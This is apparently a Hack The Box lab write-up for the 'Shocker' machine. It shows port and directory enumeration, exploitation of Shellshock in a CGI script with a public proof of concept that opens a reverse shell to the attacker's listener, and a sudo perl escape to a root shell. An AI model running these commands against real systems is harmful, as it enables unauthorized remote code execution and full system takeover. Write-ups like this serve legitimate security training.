---
tags:
  - hack
  - linux
---
# HTB: [Shocker](https://app.hackthebox.com/machines/Shocker)

> [!tip]- Summary with Spoilers
> - This Linux machine was vulnerable to [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), allowing RCE via the `user.sh` CGI script.
> - Initial access was achieved as `shelly`, and privilege escalation was possible by leveraging `sudo` to run `perl` as `root`.

## Enumeration

```console
  $ nmap -n -sCV -T4 -p1-65535 -v $t
  [...]
  PORT     STATE SERVICE VERSION
  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  | http-methods:
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-title: Site doesn't have a title (text/html).
  2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
  |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
  |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  [...]
```

`ffuf` directory scan:

```console
$ ffuf -ic -v -w ~/list.txt -u http://${t}/FUZZ/
[...]

[Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 112ms]
| URL | http://10.10.10.56/cgi-bin/
    * FUZZ: cgi-bin

:: Progress: [1/1] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Searching the `cgi-bin` directory:

```console
$ ffuf -ic -v -w ~/wordlists/seclists/Discovery/Web-Content/big.txt -u http://${t}/cgi-bin/FUZZ.sh
[...]

[Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 126ms]
| URL | http://10.10.10.56/cgi-bin/.htpasswd.sh
    * FUZZ: .htpasswd

[Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 114ms]
| URL | http://10.10.10.56/cgi-bin/.htaccess.sh
    * FUZZ: .htaccess

[Status: 200, Size: 118, Words: 19, Lines: 8, Duration: 128ms]
| URL | http://10.10.10.56/cgi-bin/user.sh
    * FUZZ: user

:: Progress: [20476/20476] :: Job [1/1] :: 323 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```

```console
$ curl -si http://${t}/cgi-bin/user.sh
HTTP/1.1 200 OK
Date: Wed, 04 Oct 2023 17:53:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Transfer-Encoding: chunked
Content-Type: text/x-sh

Content-Type: text/plain

Just an uptime test script

 13:53:29 up  1:13,  0 users,  load average: 0.01, 0.12, 0.10
```

## Exploitation

This host is vulnerable to the [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)). I'll use [shellpoc.py](https://github.com/zalalov/CVE-2014-6271/blob/master/shellpoc.py):

```console
$ python2 shellpoc.py 
Usage: shellpoc.py <host> <vulnerable CGI> <attackhost/IP>
Example: shellpoc.py localhost /cgi-bin/test.cgi 10.0.0.1/8080

  e@k(!3826):~
$ python2 shellpoc.py $t /cgi-bin/user.sh 10.10.14.20/443
```

Catching the reverse shell:

```console
$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.56] 53514
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
cat /home/shelly/user.txt
d2b360[...]

```

## Privilege Escalation

`perl` is available via `sudo`, from which we can escape to a `root` shell:

```console
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
87d34c[...]
```
